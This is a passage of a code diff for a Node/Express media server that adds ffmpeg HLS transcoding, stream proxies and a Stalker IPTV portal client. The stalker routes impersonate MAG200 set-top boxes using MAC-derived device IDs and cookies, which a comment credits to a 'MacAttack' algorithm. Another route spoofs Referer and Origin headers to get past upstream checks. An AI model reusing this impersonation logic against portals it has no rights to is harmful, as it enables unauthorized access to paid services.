+    '-fflags', '+genpts+discardcorrupt+igndts',  // handle corrupt/PTS streams
+    '-max_delay', '500000',             // 500ms max mux delay — don't let ffmpeg internally buffer
+    '-analyzeduration', '1500000',      // 1.5s analyze — faster probe, less misdetect
+    '-probesize', '1000000',            // 1MB probe — match backup
+    '-i', targetUrl,                // input stream (no -re — encode ahead of live for buffer)
+    '-c:v', 'libx264',              // video codec: H.264
+    '-preset', 'ultrafast',         // ultrafast: lowest CPU, good enough for live IPTV
+    '-tune', 'zerolatency',         // low latency
+    '-pix_fmt', 'yuv420p',          // broad compatibility
+    '-b:v', bitrate,                // video bitrate
+    '-maxrate', bitrate,            // cap bitrate
+    '-bufsize', `${parseInt(bitrate)*2}k`, // buffer
+    '-g', '60',                         // keyframe every 60 frames (2s at 30fps)
+    '-keyint_min', '60',               // force keyframe interval
+    '-force_key_frames', 'expr:gte(t,n_forced*2)',  // keyframe every 2s for clean HLS segments
+    '-c:a', 'aac',                  // audio codec: AAC
+    '-ac', '2',                     // stereo
+    '-ar', '48000',                 // 48kHz audio
+    '-b:a', audioBitrate,           // audio bitrate
+    '-f', 'hls',                    // output format: HLS
+    '-hls_time', '2',               // 2s segments — faster start, lower latency
+    '-hls_list_size', '10',          // 10 × 2s = 20s sliding window (was 40, but transcode controls keyframes)
+    '-hls_delete_threshold', '5',    // delete old segments sooner
+    '-hls_flags', 'delete_segments+append_list+omit_endlist+independent_segments',
+    '-hls_segment_type', 'mpegts',
+    '-start_number', '0',
+    '-hls_segment_filename', path.join(tmpDir, 'seg_%03d.ts'),
+    '-master_pl_name', 'master.m3u8',
+    path.join(tmpDir, 'index.m3u8'),
+  ];
+
+  const ffmpeg = spawn('ffmpeg', ffmpegArgs, {
+    stdio: ['pipe', 'pipe', 'pipe'],
+  });
+
+  activeTranscodes.set(sessionId, { process: ffmpeg, tmpDir, url: targetUrl, lastAccess: Date.now() });
+
+  // Wait for the index.m3u8 to exist then serve the master playlist
+  const playlistPath = path.join(tmpDir, 'index.m3u8');
+  let servedPlaylist = false;
+  const serveTranscodePlaylist = () => {
+    if (res.headersSent) return true;
+    if (!fs.existsSync(playlistPath) || fs.statSync(playlistPath).size <= 0) return false;
+    console.log(`[TRANSCODE] ${sessionId}: Playlist ready, serving`);
+
+    // Serve the master playlist with proper CORS
+    // Rewrite relative paths to point through the session endpoint
+    const masterPath = path.join(tmpDir, 'master.m3u8');
+    const servePath = fs.existsSync(masterPath) ? masterPath : playlistPath;
+    let content = fs.readFileSync(servePath, 'utf8');
+    // Rewrite segment/playlist refs: seg_001.ts → /api/transcode/SESSION/seg_001.ts
+    content = content.replace(/(seg_\d+\.ts|index\.m3u8)/g, `/api/transcode/${sessionId}/$1`);
+
+    servedPlaylist = true;
+    res.writeHead(200, {
+      'Content-Type': 'application/vnd.apple.mpegurl',
+      'Access-Control-Allow-Origin': getAllowedOrigin(req),
+      'Cache-Control': 'no-cache',
+      'X-Transcode-Session': sessionId,
+      'Vary': 'Origin',
+    });
+    res.end(content);
+    return true;
+  };
+  let attempts = 0;
+  const waitForPlaylist = setInterval(() => {
+    attempts++;
+    if (serveTranscodePlaylist()) {
+      clearInterval(waitForPlaylist);
+    } else if (attempts > 30) { // 15 seconds timeout
+      clearInterval(waitForPlaylist);
+      console.error(`[TRANSCODE] ${sessionId}: Timeout waiting for playlist`);
+      if (!res.headersSent) res.status(504).json({ error: 'Transcode timeout — upstream may be down or incompatible' });
+      cleanupTranscode(sessionId);
+    }
+  }, 500);
+
+  // Log ffmpeg stderr for debugging
+  let ffmpegLog = '';
+  ffmpeg.stderr.on('data', (d) => {
+    const line = d.toString();
+    ffmpegLog += line;
+    if (line.includes('error') || line.includes('Error')) {
+      console.error(`[TRANSCODE] ${sessionId} ffmpeg: ${line.trim()}`);
+    }
+  });
+
+  ffmpeg.on('error', (err) => {
+    console.error(`[TRANSCODE] ${sessionId} spawn error: ${err.message}`);
+    if (!res.headersSent) res.status(500).json({ error: 'Failed to start ffmpeg', detail: err.message });
+    cleanupTranscode(sessionId);
+  });
+
+  ffmpeg.on('close', (code) => {
+    console.log(`[TRANSCODE] ${sessionId}: ffmpeg exited with code ${code}`);
+    clearInterval(waitForPlaylist);
+    if (!res.headersSent && serveTranscodePlaylist()) return;
+    setTimeout(() => {
+      if (!res.headersSent && serveTranscodePlaylist()) return;
+      if (!res.headersSent && code !== 0) {
+        res.status(502).json({ error: 'Transcode failed', detail: ffmpegLog.slice(-1500) });
+      }
+      // Cleanup after a delay — segments may still be requested
+      setTimeout(() => cleanupTranscode(sessionId), 15 * 60 * 1000);
+    }, 900);
+  });
+
+  // If client disconnects, kill ffmpeg
+  req.on('close', () => {
+    if (servedPlaylist) return;
+    console.log(`[TRANSCODE] ${sessionId}: Client disconnected, killing ffmpeg`);
+    ffmpeg.kill('SIGKILL');
+    cleanupTranscode(sessionId);
+  });
+});
+
+// Serve transcode segments and playlists
+app.get('/api/transcode/:sessionId/:filename', (req, res) => {
+  const { sessionId, filename } = req.params;
+
+  // Validate filename — only serve .m3u8 and .ts files
+  if (!filename.match(/^[\w.-]+\.(m3u8|ts)$/)) {
+    return res.status(400).json({ error: 'Invalid file type' });
+  }
+
+  // Update last access time — keeps ffmpeg alive while client is watching
+  const session = activeTranscodes.get(sessionId);
+  if (session) session.lastAccess = Date.now();
+
+  const tmpDir = path.join(os.tmpdir(), `cinevault-tc-${sessionId}`);
+  const filePath = path.join(tmpDir, filename);
+  const ext = path.extname(filename);
+  const contentType = ext === '.m3u8' ? 'application/vnd.apple.mpegurl' : 'video/mp2t';
+
+  const serveFile = () => {
+    if (!fs.existsSync(filePath) || fs.statSync(filePath).size <= 0) return false;
+    if (ext === '.m3u8') {
+      // Rewrite playlist paths to route through the session endpoint
+      let content = fs.readFileSync(filePath, 'utf8');
+      content = content.replace(/(seg_\d+\.ts)/g, `/api/transcode/${sessionId}/$1`);
+      res.writeHead(200, {
+        'Content-Type': contentType,
+        'Access-Control-Allow-Origin': getAllowedOrigin(req),
+        'Cache-Control': 'no-cache',
+        'Vary': 'Origin',
+      });
+      res.end(content);
+    } else {
+      // .ts segment — pipe directly
+      res.writeHead(200, {
+        'Content-Type': contentType,
+        'Access-Control-Allow-Origin': getAllowedOrigin(req),
+        'Cache-Control': 'public, max-age=3600',
+        'Vary': 'Origin',
+      });
+      fs.createReadStream(filePath).pipe(res);
+    }
+    return true;
+  };
+
+  // For .ts segments: ffmpeg produces them in real-time for live streams.
+  // HLS.js may request a segment before ffmpeg has written it to disk.
+  // Poll-wait up to 15s for the segment to appear instead of 404ing instantly.
+  if (ext === '.ts') {
+    if (serveFile()) return;
+    let tries = 0;
+    const maxTries = 30; // 30 × 500ms = 15s max wait
+    const poll = setInterval(() => {
+      tries++;
+      if (serveFile()) {
+        clearInterval(poll);
+      } else if (tries >= maxTries) {
+        clearInterval(poll);
+        if (!res.headersSent) res.status(404).json({ error: 'Segment not found', sessionId });
+      }
+    }, 500);
+    req.on('close', () => clearInterval(poll)); // client gave up
+  } else {
+    // .m3u8 playlist — serve immediately or 404
+    if (!serveFile()) {
+      res.status(404).json({ error: 'Playlist not found', sessionId });
+    }
+  }
+});
+
+// ── Shared stalker session pool — multiple devices watch the same channel on ONE ffmpeg ──
+// Key: `${base}:${mac}:${cmd}` → { sessionId, refCount, clients:Set<ip>, lastAccess }
+const sharedStalkerSessions = new Map();
+
+// Cleanup transcode session
+function cleanupTranscode(sessionId) {
+  const session = activeTranscodes.get(sessionId);
+  if (session) {
+    try { session.process.kill('SIGKILL'); } catch {}
+    activeTranscodes.delete(sessionId);
+  }
+  // Also clean up any shared pool entries pointing to this session
+  for (const [key, entry] of sharedStalkerSessions) {
+    if (entry.sessionId === sessionId) {
+      sharedStalkerSessions.delete(key);
+      console.log(`[STALKER-HLS-POOL] Cleaned up pool entry for dead session ${sessionId}`);
+    }
+  }
+  const tmpDir = path.join(os.tmpdir(), `cinevault-tc-${sessionId}`);
+  // Clean up temp files after a delay
+  setTimeout(() => {
+    try { fs.rmSync(tmpDir, { recursive: true, force: true }); } catch {}
+    console.log(`[TRANSCODE] ${sessionId}: Cleaned up ${tmpDir}`);
+  }, 10000);
+}
+
+// ═══════════════════════════════════════════════════════════════
+//  /api/tvpass-stream — HLS proxy for tvpass.org live TV streams
+//  Rewrites M3U8 manifests so HLS.js loads segments through us
+//  ?url=<tvpass.org/live/{id}/hd> or ?url=<tvpass.org/live/{id}/sd>
+// ═══════════════════════════════════════════════════════════════
+app.get('/api/tvpass-stream', async (req, res) => {
+  const targetUrl = req.query.url;
+  if (!targetUrl) return res.status(400).json({ error: 'Missing ?url= parameter' });
+  if (!isUrlAllowed(targetUrl)) return res.status(403).json({ error: 'Blocked: URL targets private/internal network' });
+
+  try {
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 30000);
+
+    const upstream = await fetch(targetUrl, {
+      signal: controller.signal,
+      headers: {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
+        'Accept': '*/*',
+      },
+      redirect: 'follow',
+    });
+    clearTimeout(timeout);
+
+    if (!upstream.ok) {
+      return res.status(upstream.status).json({ error: `TVPass returned ${upstream.status}` });
+    }
+
+    const contentType = upstream.headers.get('content-type') || '';
+    const body = await upstream.text();
+
+    // If M3U8 manifest — rewrite internal URLs to go through our proxy
+    if (contentType.includes('mpegurl') || contentType.includes('vnd.apple') || targetUrl.includes('.m3u8') || targetUrl.includes('/hd') || targetUrl.includes('/sd')) {
+      const rewritten = rewriteM3U8Playlist(body, targetUrl, '/api/tvpass-stream');
+
+      res.set({
+        'Content-Type': 'application/vnd.apple.mpegurl',
+        'Access-Control-Allow-Origin': getAllowedOrigin(req),
+        'Cache-Control': 'no-store, no-cache',
+      });
+      return res.send(rewritten);
+    }
+
+    // Binary content (TS segments, etc) — proxy directly
+    const buf = await upstream.buffer();
+    res.set({
+      'Content-Type': contentType,
+      'Access-Control-Allow-Origin': getAllowedOrigin(req),
+      'Cache-Control': 'public, max-age=60',
+    });
+    return res.send(buf);
+  } catch (err) {
+    console.error(`[TVPASS-STREAM] Error: ${err.message}`);
+    res.status(502).json({ error: 'TVPass stream proxy failed', detail: err.message });
+  }
+
+  function proxyUrl(u) {
+    return `/api/tvpass-stream?url=${encodeURIComponent(u)}`;
+  }
+});
+
+// ═══════════════════════════════════════════════════════════════
+//  /api/stream-proxy — Generic HLS/stream proxy with header spoofing
+//  ?url=<any m3u8 or media URL>
+//  Adds Referer + Origin + User-Agent headers, rewrites M3U8 manifests,
+//  pipes binary content (TS segments, etc.) directly without buffering
+// ═══════════════════════════════════════════════════════════════
+app.get('/api/stream-proxy', async (req, res) => {
+  const targetUrl = req.query.url;
+  if (!targetUrl) return res.status(400).json({ error: 'Missing ?url= parameter' });
+  if (!isUrlAllowed(targetUrl)) return res.status(403).json({ error: 'Blocked: URL targets private/internal network' });
+
+  // Track stream for multi-device monitoring
+  const sIp = req.ip || req.connection?.remoteAddress || 'unknown';
+  const sId = `${sIp}:stream-proxy:${targetUrl.slice(0,40)}`;
+  trackStreamStart(sIp, sId, 'stream-proxy');
+  res.on('close', () => trackStreamEnd(sIp, sId));
+  res.on('finish', () => trackStreamEnd(sIp, sId));
+
+  try {
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 30000);
+
+    // Build spoofed Referer/Origin from target URL's own origin
+    let spoofOrigin = '';
+    try { spoofOrigin = new URL(targetUrl).origin; } catch { spoofOrigin = 'https://phantomide.local'; }
+
+    const upstream = await fetch(targetUrl, {
+      signal: controller.signal,
+      agent: targetUrl.startsWith('https:') ? lenientHttpsAgent : undefined,
+      headers: {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
+        'Accept': '*/*',
+        'Accept-Language': 'en-US,en;q=0.9',
+        'Referer': spoofOrigin + '/',
+        'Origin': spoofOrigin,
+      },
+      redirect: 'follow',
+    });
+    clearTimeout(timeout);
+
+    if (!upstream.ok) {
+      return res.status(upstream.status).json({ error: `Upstream returned ${upstream.status}` });
+    }
+
+    const contentType = upstream.headers.get('content-type') || '';
+
+    // M3U8 manifest — rewrite URLs to go through this proxy
+    if (contentType.includes('mpegurl') || contentType.includes('vnd.apple') || targetUrl.includes('.m3u8')) {
+      const body = await upstream.text();
+      const rewritten = rewriteM3U8Playlist(body, targetUrl, '/api/stream-proxy');
+
+      res.set({
+        'Content-Type': 'application/vnd.apple.mpegurl',
+        'Access-Control-Allow-Origin': getAllowedOrigin(req),
+        'Cache-Control': 'no-store, no-cache',
+      });
+      return res.send(rewritten);
+    }
+
+    // Binary content (TS segments, video, etc) — pipe directly
+    const contentLength = upstream.headers.get('content-length');
+    const headers = {
+      'Content-Type': contentType,
+      'Access-Control-Allow-Origin': getAllowedOrigin(req),
+      'Cache-Control': 'public, max-age=60',
+    };
+    if (contentLength) headers['Content-Length'] = contentLength;
+    if (req.headers.range) headers['Accept-Ranges'] = 'bytes';
+    res.set(headers);
+
+    // Stream the body directly without buffering the whole thing
+    upstream.body.pipe(res);
+
+  } catch (err) {
+    console.error(`[STREAM-PROXY] Error fetching ${targetUrl}: ${err.message}`);
+    if (!res.headersSent) res.status(502).json({ error: 'Stream proxy failed', detail: err.message });
+  }
+});
+
+// ═════════════════════════════════════════════
+//  /api/embed-proxy — Embed streaming proxy
+//  Proxies embed page content, rewriting URLs so
+//  the iframe loads through our server
+// ═════════════════════════════════════════════
+app.get('/api/embed-proxy', async (req, res) => {
+  const targetUrl = req.query.url;
+  if (!targetUrl) return res.status(400).json({ error: 'Missing ?url= parameter' });
+  if (!isUrlAllowed(targetUrl)) return res.status(403).json({ error: 'Blocked: URL targets private/internal network' });
+
+  try {
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 15000);
+
+    const upstream = await fetch(targetUrl, {
+      signal: controller.signal,
+      headers: {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+        'Accept': 'text/html,application/xhtml+xml,*/*',
+        'Accept-Language': 'en-US,en;q=0.9',
+        'Referer': new URL(targetUrl).origin + '/',
+      },
+      redirect: 'follow',
+    });
+    clearTimeout(timeout);
+
+    const contentType = upstream.headers.get('content-type') || '';
+    if (contentType.includes('text/html') || contentType.includes('javascript')) {
+      let html = await upstream.text();
+      // Rewrite src/href/action URLs through our proxy
+      const proxyBase = `${req.protocol}://${req.get('host')}/api/embed-proxy?url=`;
+      html = html.replace(/(src|href|action)=["'](https?:\/\/[^"']+)["']/gi, (match, attr, url) => {
+        // Don't rewrite data: or blob: URLs
+        if (url.startsWith('data:') || url.startsWith('blob:')) return match;
+        return `${attr}="${proxyBase}${encodeURIComponent(url)}"`;
+      });
+
+      // XSS Sanitization: Strip <script> blocks and on* event handler attributes
+      html = html.replace(/<script[\s\S]*?<\/script\s*>/gi, '');
+      html = html.replace(/\s+on\w+\s*=\s*(?:"[^"]*"|'[^']*'|[^\s>]+)/gi, '');
+      // Strip javascript: URLs in src/href/action attributes
+      html = html.replace(/(src|href|action)\s*=\s*["']javascript:[^"']*["']/gi, '$1=""');
+
+      const origin = getAllowedOrigin(req);
+      res.set('Content-Type', 'text/html');
+      res.set('Access-Control-Allow-Origin', origin);
+      res.set('Vary', 'Origin');
+      res.send(html);
+    } else {
+      // Pass through non-HTML content (images, JS, CSS, etc.)
+      const body = await upstream.buffer();
+      const origin = getAllowedOrigin(req);
+      res.set({
+        'Content-Type': contentType,
+        'Access-Control-Allow-Origin': origin,
+        'Vary': 'Origin',
+        'Cache-Control': 'public, max-age=3600',
+      });
+      res.send(body);
+    }
+  } catch (err) {
+    console.error(`[EMBED-PROXY] Error: ${err.message}`);
+    res.status(502).json({ error: 'Embed proxy failed', detail: 'Request failed' });
+  }
+});
+
+// ═══════════════════════════════════════════
+//  /api/stalker-proxy — Stalker portal proxy
+//  Proxies stalker portal requests with MAC auth
+//  ?url=<portal handshake/channel URL>
+//  Headers: X-Stalker-MAC, X-Stalker-SN
+// ═══════════════════════════════════════════
+app.get('/api/stalker-proxy', async (req, res) => {
+  const targetUrl = req.query.url;
+  if (!targetUrl) return res.status(400).json({ error: 'Missing ?url= parameter' });
+  if (!isUrlAllowed(targetUrl)) return res.status(403).json({ error: 'Blocked: URL targets private/internal network' });
+
+  const mac = req.headers['x-stalker-mac'] || req.query.mac || '';
+  const sn = req.headers['x-stalker-sn'] || req.query.sn || '';
+
+  // Track active stalker portal for VLC launch
+  if (mac) {
+    global._stalkerMac = mac;
+    global._stalkerPortalUrl = targetUrl;
+  }
+
+  try {
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 15000);
+
+    // Derive full device IDs — exact MacAttack algorithm
+    const serialNum = mac ? crypto.createHash('md5').update(mac).digest('hex').substring(0, 13).toUpperCase() : sn;
+    const deviceId = serialNum ? crypto.createHash('sha256').update(serialNum).digest('hex').toUpperCase() : '';
+    const deviceId2 = mac ? crypto.createHash('sha256').update(mac).digest('hex').toUpperCase() : '';
+    const hwVersion = mac ? crypto.createHash('sha1').update(mac).digest('hex') : '';
+    const tokenVal = req.query.token || '';
+
+    // Full MacAttack cookie set (9 cookies + token)
+    const cookieStr = [
+      hwVersion ? `adid=${hwVersion}` : '',
+      'debug=1',
+      deviceId2 ? `device_id2=${deviceId2}` : '',
+      deviceId ? `device_id=${deviceId}` : '',
+      'hw_version=1.7-BD-00',
+      mac ? `mac=${mac}` : '',
+      serialNum ? `sn=${serialNum}` : '',
+      'stb_lang=en',
+      'timezone=America/Los_Angeles',
+      tokenVal ? `token=${tokenVal}` : '',
+    ].filter(Boolean).join('; ');
+
+    // Forward Authorization header if provided via query param or request header
+    const authHeader = tokenVal ? `Bearer ${tokenVal}` : (req.headers['authorization'] || '');
+
+    // Forward X-Random header if provided (MacAttack token_random)
+    const xRandom = req.headers['x-random'] || req.query.tokenRandom || '';
+
+    const upstream = await fetch(targetUrl, {
+      signal: controller.signal,
+      headers: {
+        'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3',
+        'Accept': '*/*',
+        'Accept-Encoding': 'identity',
+        'Cookie': cookieStr,
+        ...(authHeader ? { 'Authorization': authHeader } : {}),
+        ...(xRandom ? { 'X-Random': xRandom } : {}),
+      },
+      redirect: 'follow',
+    });
+    clearTimeout(timeout);
+
+    const contentType = upstream.headers.get('content-type') || '';
+    const body = await upstream.buffer();
+
+    const origin = getAllowedOrigin(req);
+    const stalkerHeaders = {
+      'Content-Type': contentType,
+      'Access-Control-Allow-Origin': origin,
+      'Vary': 'Origin',
+      'Access-Control-Allow-Headers': 'X-Stalker-MAC, X-Stalker-SN, Content-Type',
+      'Set-Cookie': cookieStr,
+    };
+    // Only set Allow-Credentials when origin is explicitly whitelisted (never with wildcard/empty)
+    if (origin && isOriginAllowed(req.headers.origin)) {
+      stalkerHeaders['Access-Control-Allow-Credentials'] = 'true';
+    }
+    res.set(stalkerHeaders);
+    res.send(body);
+  } catch (err) {
+    console.error(`[STALKER-PROXY] Error: ${err.message}`);
+    res.status(502).json({ error: 'Stalker proxy failed', detail: 'Request failed' });
+  }
+});
+
+// ── Stalker Stream Proxy (for video playback) ──
+// Proxies video stream data with MAG200 auth — browser can't send cookies cross-origin
+// ?url=<stream URL>&mac=<MAC>&token=<token>
+// Supports range requests for seeking
+app.get('/api/stalker-stream', async (req, res) => {
+  let streamUrl = req.query.url;
+  if (!streamUrl) return res.status(400).json({ error: 'Missing ?url= parameter' });
+
+  // Track stream for multi-device health monitoring
+  const clientIp = req.ip || req.connection?.remoteAddress || 'unknown';
+  const streamId = `${clientIp}:stalker-stream:${streamUrl.slice(0,40)}`;
+  trackStreamStart(clientIp, streamId, 'stalker-stream');
+  res.on('close', () => trackStreamEnd(clientIp, streamId));
+  res.on('finish', () => trackStreamEnd(clientIp, streamId));
+
+  const mac = req.query.mac || '';
+  const portalUrl = req.query.portal || '';
+  const oldToken = req.query.token || '';
+
+  // If streamUrl is a raw /ch/ style (e.g. "ffmpeg http://localhost/ch/123_"),
+  // resolve it via create_link first — handshake + create_link in one shot
+  let needsResolve = false;
+  if (streamUrl.startsWith('ffmpeg ')) streamUrl = streamUrl.substring(7);
+  if (streamUrl.includes('/ch/') && (streamUrl.includes('localhost') || !streamUrl.startsWith('http'))) {
+    needsResolve = true;
+  }
+
+  // Security: block private/internal URLs ONLY if they won't be resolved.
+  // /ch/ style localhost URLs get resolved to real CDN URLs, so skip the block.
+  if (!needsResolve && !isUrlAllowed(streamUrl)) {
+    return res.status(403).json({ error: 'Blocked: URL targets private/internal network' });
+  }
+
+  try {
+    const serialNum = mac ? crypto.createHash('md5').update(mac).digest('hex').substring(0, 13).toUpperCase() : '';
+    const deviceId = serialNum ? crypto.createHash('sha256').update(serialNum).digest('hex').toUpperCase() : '';
+    const deviceId2 = mac ? crypto.createHash('sha256').update(mac).digest('hex').toUpperCase() : '';
+    const hwVersion = mac ? crypto.createHash('sha1').update(mac).digest('hex') : '';
+    let token = oldToken;
+
+    // CRITICAL: Only do fresh handshake if we NEED to resolve the URL (raw /ch/ style).
+    // If the URL already has play_token, it was issued under the current session —
+    // a new handshake would invalidate that session and make the play_token return 401.
+    if (needsResolve && portalUrl && mac) {
+      if (!isUrlAllowed(portalUrl)) {
+        return res.status(403).json({ error: 'Blocked: Portal URL targets private/internal network' });
+      }
+      try {
+        let base = resolveStalkerPortal(portalUrl).apiUrl;
+        // Fresh handshake
+        const hsUrl = `${base}?action=handshake&type=stb&token=&JsHttpRequest=1-xml`;
+        const hsCookies = [`adid=${hwVersion}`,'debug=1',`device_id2=${deviceId2}`,`device_id=${deviceId}`,'hw_version=1.7-BD-00',`mac=${mac}`,`sn=${serialNum}`,'stb_lang=en','timezone=America/Los_Angeles'].filter(Boolean).join('; ');
+        const hsRes = await fetch(hsUrl, {
+          headers: { 'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3', 'Accept': '*/*', 'Accept-Encoding': 'identity', 'Cookie': hsCookies },
+          signal: AbortSignal.timeout(8000),
+        });
+        if (hsRes.ok) {
+          const hsData = await hsRes.json();
+          const fresh = hsData?.js?.token;
+          if (fresh) { token = fresh; console.log(`[STALKER-STREAM] Fresh token: ${fresh.substring(0,16)}...`); }
+        }
+
+        // Now create_link using the same session
+        const chId = streamUrl.match(/ch\/(\d+)_/)?.[1] || '';
+        if (chId) {
+          const clCmd = `ffmpeg http://localhost/ch/${chId}_`;
+          const clUrl = `${base}?action=create_link&type=itv&cmd=${encodeURIComponent(clCmd)}&JsHttpRequest=1-xml`;
+          const clCookies = [`adid=${hwVersion}`,'debug=1',`device_id2=${deviceId2}`,`device_id=${deviceId}`,'hw_version=1.7-BD-00',`mac=${mac}`,`sn=${serialNum}`,'stb_lang=en','timezone=America/Los_Angeles',`token=${token}`].filter(Boolean).join('; ');
+          const clRes = await fetch(clUrl, {
+            headers: { 'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3', 'Accept': '*/*', 'Accept-Encoding': 'identity', 'Cookie': clCookies },
+            signal: AbortSignal.timeout(8000),
+          });
+          if (clRes.ok) {
+            const clData = await clRes.json();
+            const resolved = clData?.js?.cmd;
+            if (resolved && resolved.startsWith('ffmpeg ')) {
+              streamUrl = resolved.substring(7);
+              console.log(`[STALKER-STREAM] Resolved /ch/ → ${streamUrl.substring(0,80)}`);
+            } else if (resolved && resolved.startsWith('http')) {
+              streamUrl = resolved.startsWith('ffmpeg ') ? resolved.substring(7) : resolved;
+              console.log(`[STALKER-STREAM] Resolved /ch/ → ${streamUrl.substring(0,80)}`);
+            }
+          }
+        }
+      } catch (e) { console.log(`[STALKER-STREAM] Resolve failed: ${e.message}`); }
+    }
+
+    const cookieStr = [
+      hwVersion ? `adid=${hwVersion}` : '',
+      'debug=1',
+      deviceId2 ? `device_id2=${deviceId2}` : '',
+      deviceId ? `device_id=${deviceId}` : '',
+      'hw_version=1.7-BD-00',
+      mac ? `mac=${mac}` : '',
+      serialNum ? `sn=${serialNum}` : '',
+      'stb_lang=en',
+      'timezone=America/Los_Angeles',
+      token ? `token=${token}` : '',
+    ].filter(Boolean).join('; ');
+
+    // The CDN checks that the Cookie token matches the session that issued the play_token.
+    // Always send full MAG200 cookies — the token from create-link must match.
+    // Only skip if we have no token at all (unlikely but safe).
+    const fetchHeaders = {
+      'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3',
+      'Accept': '*/*',
+      'Accept-Encoding': 'identity',
+      'Connection': 'keep-alive',
+      'Cookie': cookieStr,
+      ...(portalUrl ? { 'Referer': portalUrl } : {}),
+      ...(token ? { 'Authorization': `Bearer ${token}` } : {}),
+    };
+
+    // Forward Range header for seeking
+    if (req.headers.range) fetchHeaders['Range'] = req.headers.range;
+
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 30000);
+
+    const upstream = await fetch(streamUrl, {
+      headers: fetchHeaders,
+      signal: controller.signal,
+    });
+    clearTimeout(timeout);
+
+    if (!upstream.ok) {
+      return res.status(upstream.status).json({ error: `Stream returned ${upstream.status}` });
+    }
+
+    const contentType = upstream.headers.get('content-type') || 'video/mp4';
+    const contentLength = upstream.headers.get('content-length');
+    const acceptRanges = upstream.headers.get('accept-ranges');
+    const contentRange = upstream.headers.get('content-range');
+
+    const origin = getAllowedOrigin(req);
+    const streamHeaders = {
+      'Content-Type': contentType,
+      'Access-Control-Allow-Origin': origin,
+      'Vary': 'Origin',
+      'Access-Control-Allow-Headers': 'Range',
+      'Access-Control-Expose-Headers': 'Content-Length, Content-Range',
+      ...(contentLength ? { 'Content-Length': contentLength } : {}),
+      ...(acceptRanges ? { 'Accept-Ranges': acceptRanges } : {}),
+      ...(contentRange ? { 'Content-Range': contentRange } : {}),
+    };
+    // Only set Allow-Credentials when origin is explicitly whitelisted (never with wildcard/empty)
+    if (origin && isOriginAllowed(req.headers.origin)) {
+      streamHeaders['Access-Control-Allow-Credentials'] = 'true';
+    }
+    res.set(streamHeaders);
+
+    if (upstream.status === 206) res.status(206);
+
+    // Stream the body through using Node.js pipe
+    const body = upstream.body;
+    body.on('data', (chunk) => res.write(chunk));
+    body.on('end', () => res.end());
+    body.on('error', () => res.end());
+
+  } catch (err) {
+    console.error(`[STALKER-STREAM] Error: ${err.message}`);
+    if (!res.headersSent) res.status(502).json({ error: 'Stream proxy failed', detail: 'Request failed' });
+  }
+});
+
+// ── Stalker HLS Transcode (one-shot: handshake → create_link → ffmpeg HLS) ──
+// Given a stalker portal URL, MAC, and channel cmd, resolve the stream URL
+// and transcode it to HLS via ffmpeg so the browser can play it with HLS.js.
+// ── Stalker Resolve — handshake + create_link, returns raw CDN URL for VLC ──
+app.get('/api/stalker-resolve', async (req, res) => {
+  const { url: portalUrl, mac, cmd } = req.query;
+  if (!portalUrl || !mac || !cmd) return res.status(400).json({ error: 'Missing url, mac, or cmd' });
+
+  const base = resolveStalkerPortal(portalUrl).apiUrl;
+  const serialNum = crypto.createHash('md5').update(mac).digest('hex').substring(0, 13).toUpperCase();
+  const deviceId = crypto.createHash('sha256').update(serialNum).digest('hex').toUpperCase();
+  const deviceId2 = crypto.createHash('sha256').update(mac).digest('hex').toUpperCase();
+  const hwVersion = crypto.createHash('sha1').update(mac).digest('hex');
+  const cookieBase = [`adid=${hwVersion}`,'debug=1',`device_id2=${deviceId2}`,`device_id=${deviceId}`,'hw_version=1.7-BD-00',`mac=${mac}`,`sn=${serialNum}`,'stb_lang=en','timezone=America/Los_Angeles'].join('; ');
+  const MAG_UA = 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3';
+
+  try {
+    const hsRes = await fetch(`${base}?action=handshake&type=stb&token=&JsHttpRequest=1-xml`, {
+      headers: { 'User-Agent': MAG_UA, 'Accept': '*/*', 'Cookie': cookieBase },
+      signal: AbortSignal.timeout(8000),
+    });
+    const hsData = await hsRes.json();
+    const token = hsData?.js?.token;
+    if (!token) return res.status(502).json({ error: 'Handshake failed' });
+
+    const cmdStr = cmd.replace(/^ffmpeg\s+/i, '');
+    const cookieWithToken = cookieBase + `; token=${token}`;
+    const clRes = await fetch(`${base}?type=itv&action=create_link&cmd=${encodeURIComponent(cmdStr)}&JsHttpRequest=1-xml`, {
+      headers: { 'User-Agent': MAG_UA, 'Accept': '*/*', 'Cookie': cookieWithToken, 'Authorization': `Bearer ${token}` },
+      signal: AbortSignal.timeout(8000),
+    });
+    const clData = await clRes.json();
+    const streamUrl = (clData?.js?.cmd || '').replace(/^ffmpeg\s+/i, '');
+    if (!streamUrl) return res.status(502).json({ error: 'create_link returned no URL' });
+    res.json({ streamUrl });
+  } catch (e) {
+    res.status(502).json({ error: e.message });
+  }
+});
+
+// ════════════════════════════════════════════════════════════
+// VLC STALKER ULTRA — Class-based stalker client + VLC manager
+// ════════════════════════════════════════════════════════════
+
+// ── VLC Debug Logger middleware ──
+app.use('/api/vlc', (req, res, next) => {
+  const start = Date.now();
+  res.on('finish', () => {
